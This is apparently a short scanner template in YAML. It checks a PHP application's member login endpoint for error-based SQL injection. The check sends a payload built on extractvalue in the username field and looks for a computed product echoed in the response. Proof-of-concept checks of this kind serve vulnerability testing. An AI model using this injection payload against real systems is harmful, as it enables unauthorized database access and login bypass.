- method: POST
  path: /index.php?m=member&f=login_save
  headers: {}
  data: username=dd' or extractvalue(0x0a,concat(0x0a,{{.r1}}*{{.r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, r1 * r2)
  output: []
